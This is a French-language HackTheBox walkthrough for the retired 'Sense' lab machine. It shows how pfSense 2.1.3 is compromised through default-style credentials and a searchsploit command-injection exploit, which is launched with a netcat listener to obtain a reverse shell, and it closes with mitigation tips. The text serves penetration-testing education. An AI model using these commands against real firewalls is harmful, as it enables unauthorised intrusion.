---
title: Sense Walkthrough – HackTheBox
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2022-08-12T16:09:26.000Z'
originalURL: https://freecodecamp.org/news/sense-walkthrough-hackthebox
coverImage: https://www.freecodecamp.org/news/content/images/2022/08/sense--1-.png
tags:
- name: cybersecurity
  slug: cybersecurity
- name: information security
  slug: information-security
- name: '#infosec'
  slug: infosec
- name: kali
  slug: kali
- name: Linux
  slug: linux
seo_title: Sense Walkthrough – HackTheBox
seo_desc: "By Shuaib Oseni\nHackTheBox is an online hacking platform that allows you\
  \ to test and practice your penetration testing skills. \nIt contains several vulnerable\
  \ labs that are constantly updated. Some of them simulate real-world scenarios and\
  \ some of th..."
---

Par Shuaib Oseni

HackTheBox est une plateforme de piratage en ligne qui vous permet de tester et de pratiquer vos compétences en tests d'intrusion.

Elle contient plusieurs laboratoires vulnérables qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi Capture The Flag (CTF).

Note : _Seuls les write-ups des machines HTB retirées sont autorisés._

## Prérequis

Pour tirer le meilleur parti de ce guide, vous aurez besoin des éléments suivants :

* Un abonnement VIP [HackTheBox](https://www.hackthebox.com/).
* Le système d'exploitation Kali Linux.
* Des connaissances de base en bruteforcing.

## Informations sur la machine

**Nom :** Sense

**Adresse IP :** 10.10.10.60

**Système d'exploitation :** FreeBSD

Attachez vos ceintures, tout le monde – nous partons pour un tour !

## Étape 1 – Faire de la reconnaissance

La reconnaissance est le processus de collecte d'autant d'informations que possible sur un système cible, et c'est généralement la première étape vers tout piratage.

Commençons par exécuter une analyse [Nmap](https://nmap.org/) pour recueillir des informations sur les ports ouverts et les services en cours d'exécution sur cette machine en exécutant la commande suivante :

```bash
nmap -A -T4 -p- 10.10.10.60
```

Voici le résultat :

```bash
nmap -A -T4 -p- 10.10.10.60
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 05:23 EST
Nmap scan report for 10.10.10.60
Host is up (0.36s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/https?
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1561.11 seconds
```

D'après le résultat de l'analyse, nous pouvons voir qu'il y a 2 ports ouverts :

* Port 80 - Hyper Text Transfer Protocol (HTTP)
* Port 443 - Hyper Text Transfer Protocol Secured (HTTPS)

## Étape 2 – Visiter l'adresse IP

Maintenant, visitons l'adresse IP dans un navigateur.

![sense login page](https://www.freecodecamp.org/news/content/images/2022/08/login.png)
_page de connexion sense_

Nous obtenons une page de connexion pfsense. Les identifiants par défaut pour pfsense sont `admin/pfsense`. Malheureusement, ces identifiants n'ont pas fonctionné.

## Étape 3 – Utiliser la force brute des répertoires

Vous utilisez la force brute des répertoires pour trouver des répertoires cachés sur une application web.

Maintenant, effectuons une force brute des répertoires en utilisant `dirbuster`.

![Image](https://www.freecodecamp.org/news/content/images/2022/08/dirbuster.png)
_dirbuster_

dirbuster nous a donné quelques éléments intéressants :

* Pages avec un code de réponse de 200.
* Un fichier `changelog-txt`.
* Un fichier `system-user-txt`.

`changelog-txt` et `system-user-txt` semblent super intéressants, alors voyons si nous pouvons afficher leur contenu.

Pour lire le contenu de ce fichier, nous tapons `10.10.10.60/changelog.txt` dans notre navigateur.

`changelog.txt` contient ce qui suit :

![Image](https://www.freecodecamp.org/news/content/images/2022/08/changelog.png)
_fichier changelog.txt_

Pour lire le contenu de ce fichier, nous tapons `10.10.10.60/system-users.txt` dans notre navigateur.

`system-users.txt` contient ce qui suit :

![Image](https://www.freecodecamp.org/news/content/images/2022/08/system.png)
_fichier system-user.txt_

## Étape 4 – Essayer de se connecter

`system-users.txt` contient un nom d'utilisateur "Rohit" et un mot de passe "company defaults", qui ne ressemble pas à un mot de passe. Et si company defaults = mot de passe par défaut de pfsense ? Essayons-le :

* **nom d'utilisateur :** Rohit
* **mot de passe :** pfsense

![Image](https://www.freecodecamp.org/news/content/images/2022/08/dash.png)
_tableau de bord_

Nous sommes redirigés vers le tableau de bord de Rohit. Cliquons autour pour voir si nous pouvons obtenir des informations intéressantes ou un numéro de version.

La page admin contient un numéro de version

![Image](https://www.freecodecamp.org/news/content/images/2022/08/version.png)
_numéro de version_

## Étape 5 – Lancer l'exploit

Maintenant que nous avons un numéro de version, utilisons searchsploit pour vérifier s'il existe une vulnérabilité connue sur **pfsense 2.1.3.**

Searchsploit est un outil de recherche en ligne de commande Exploit-DB pour [ExploitDB](https://www.exploit-db.com/), une archive d'exploits.

Searchsploit est préinstallé dans Kali. Maintenant, exécutons la commande suivante dans notre terminal :

```bash
searchsploit pfsense
```

![Image](https://www.freecodecamp.org/news/content/images/2022/08/exploit.png)
_résultat de searchsploit_

Maintenant que nous savons que cette version est vulnérable à une attaque **d'injection de commande**, essayons de l'exploiter.

L'injection de commande est une vulnérabilité de sécurité web qui permet à un attaquant d'exécuter des commandes OS arbitraires sur un serveur d'application, compromettant finalement l'application et ses données. Cela se produit lorsque l'entrée utilisateur non assainie est transmise via une application.

Searchsploit nous fournit un exploit Python, alors essayons-le.

Avant de lancer cet exploit, nous devons configurer un **Netcat** listener.

Netcat est un programme utilitaire réseau avec le listener étant l'une de ses fonctionnalités. Le listener vous permet d'écouter sur des ports ouverts, de créer des shells inversés, et d'envoyer des données ou des fichiers sur un réseau.

```bash
nc -lnvp 9001
```

Ensuite, nous lançons notre exploit en exécutant la commande suivante :

```bash
python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.12 --lport 9001 --username rohit --password pfsense
```

Boom ! Nous avons obtenu un shell :

![Image](https://www.freecodecamp.org/news/content/images/2022/08/shell.png)
_shell_

## Étape 6 – Trouver le user-flag

Notre shell n'est pas un shell [PTY](https://man7.org/linux/man-pages/man7/pty.7.html), ce qui signifie qu'il y a des commandes spécifiques que nous ne pouvons pas exécuter. Cependant, voyons si nous pouvons obtenir un flag avec notre shell actuel.

Déplaçons-nous vers le répertoire **rohit** et voyons ce que nous pouvons trouver.

![Image](https://www.freecodecamp.org/news/content/images/2022/08/user.png)
_user flag_

Yayyyyyyy nous avons obtenu notre user flag !

## Étape 7 – Trouver le root-flag

Et si le root flag était disponible pour nous sans avoir besoin d'une élévation de privilèges ? Voyons cela.

L'élévation de privilèges est une attaque par laquelle un utilisateur obtient un accès élevé à un système au-delà de ce qui est prévu.

Déplaçons-nous vers le répertoire **root** et voyons ce que nous pouvons trouver.

![Image](https://www.freecodecamp.org/news/content/images/2022/08/root.png)
_root flag_

Booooom ! Nous avons réussi à rooter cette machine.

## Conclusion

Nous avons pu rooter cette machine car elle était vulnérable à une attaque par injection de commande. Voici quelques-unes des façons dont vous pouvez prévenir cette vulnérabilité :

* Assainissez l'entrée utilisateur.
* Évitez d'appeler directement les commandes OS.
* Corrigiez et mettez souvent à jour l'application.